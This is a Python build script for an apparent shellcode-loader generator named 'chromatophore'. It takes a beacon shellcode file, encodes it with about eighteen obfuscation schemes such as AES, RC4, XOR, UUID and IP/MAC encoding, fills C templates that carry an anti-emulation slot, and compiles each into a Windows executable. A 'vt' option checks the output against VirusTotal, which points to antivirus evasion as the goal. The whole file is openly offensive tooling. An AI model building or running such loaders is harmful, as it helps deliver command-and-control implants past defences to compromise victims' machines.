import subprocess
import os
import sys

from vt import scan_files

from chromatophore.aes import aes
from chromatophore.bin2mac import bin2mac
from chromatophore.bin2ip import bin2ip
from chromatophore.jargon import jargon
from chromatophore.jigsaw import jigsaw
from chromatophore.base64 import base64
from chromatophore.base64api import base64api
from chromatophore.offset import offset
from chromatophore.rc4api import rc4api
from chromatophore.reverse_byte_order import reverse_byte_order
from chromatophore.xor_reverse import xor_reverse
from chromatophore.xor_single import xor_single
from chromatophore.xor_multibyte import xor_multibyte
from chromatophore.reverse_hex_string import reverse_hex_string
from chromatophore.twoarray import twoarray
from chromatophore.uuidapi import uuidapi
from chromatophore.caesar import caesar
from chromatophore.noobfuscation import noobfuscation

#import importlib
#def ImportChromatophore():
#    package = "chromatophere"
#
#    for name in module_names:
#        module = importlib.import_module(f"{package}.{name}")
#        func = getattr(module, name)
#        result = func()  # or func(some_arg)
#        print(f"{name}() => {result}")


function_map = {
    "noobfuscation": noobfuscation.noobfuscation,
    "aes": aes.aes,
    "base64": base64.base64,
    "base64api": base64api.base64api,
    "bin2ip": bin2ip.bin2ip,
    "bin2mac": bin2mac.bin2mac,
    "caesar": caesar.caesar,
    "jargon": jargon.jargon,
    "jigsaw": jigsaw.jigsaw,
    "offset": offset.offset,
    "rc4api": rc4api.rc4api,
    "reverse_byte_order": reverse_byte_order.reverse_byte_order,
    "reverse_hex_string": reverse_hex_string.reverse_hex_string,
    "twoarray": twoarray.twoarray,
    "uuidapi": uuidapi.uuidapi,
    "xor_reverse": xor_reverse.xor_reverse,
    "xor_single": xor_single.xor_single,
    "xor_multibyte": xor_multibyte.xor_multibyte,
}


def compile_all():
    clean_files()

    for module in function_map.keys():
        print("Templating")
        print("Module: " + module)

        shellcode_file = "beacon.bin"
        mod_data = function_map[module](shellcode_file)

        template_input = "chromatophore\\{}\\{}.c".format(module, module)
        template_output = "chromatophore\\{}\\{}_work.c".format(module, module)

        convert_module(template_input, template_output, mod_data)
        compile_module(module)


def test_module():
    module = "reverse_byte_order"
    
    shellcode_file = "beacon.bin"
    mod_data = function_map[module](shellcode_file)
    print("Mod data: " + mod_data)

    template_input = "chromatophore\\{}\\{}.c".format(module, module)
    template_output = "chromatophore\\{}\\{}_work.c".format(module, module)
    convert_module(template_input, template_output, mod_data)
    compile_module(module)
    #execute_module(module)


def clean_files():
    print("Cleaning files: ./chromatophore*_work.c, ./*.obj, output/*.exe")

    # delete all files in output directory recursively with file extension .exe
    output_dir = "chromatophore"
    for root, dirs, files in os.walk(output_dir):
        for file in files:
            if file.endswith("_work.c"):
                os.remove(os.path.join(root, file))
                #print("Deleted: " + os.path.join(root, file))
    
    # delete all files in this directory with file extension .obj
    for file in os.listdir("."):
        if file.endswith(".obj"):
            os.remove(file)
            #print("Deleted: " + file)

    # delete all files in output directory with file extension .exe
    output_dir = "output"
    for root, dirs, files in os.walk(output_dir):
        for file in files:
            if file.endswith(".exe"):
                os.remove(os.path.join(root, file))
                #print("Deleted: " + os.path.join(root, file))


def convert_module(template_input, template_output, mod_data, anti_emulation_data=""):
    print("Convert template: {} -> {}".format(template_input, template_output))
    with open(template_input) as template_file:
        template = template_file.read()
        template = template.replace('{{ANTI_EMULATION}}', anti_emulation_data)
        template = template.replace('{{SHELLCODE}}', mod_data)
        
        with open(template_output, 'w') as output_file:
            output_file.write(template)


def compile_module(module):
    module_c = "chromatophore\\{}\\{}_work.c".format(module, module)
    module_exe = "output\\{}.exe".format(module)

    cmd = "cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tc{} /link /OUT:{} /SUBSYSTEM:CONSOLE /MACHINE:x64".format(
        module_c, module_exe
    )

    print("Compiling: {} into {}".format(module_c, module_exe))
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print("Error executing command: " + cmd)
        sys.exit(1)


def execute_module(module):
    module_exe = "output\\{}.exe".format(module)

    print("Executing module: " + module)
    result = subprocess.run(module_exe, shell=True)


def main():
    if sys.argv[1] == "clean":
        clean_files()
    elif sys.argv[1] == "compile":
        compile_all()
    elif sys.argv[1] == "vt":
        scan_files()
    elif sys.argv[1] == "test":
        test_module()
    else:
        print("Invalid argument. Use 'clean', 'compile', or 'vt'.")

if __name__ == "__main__":
    main()
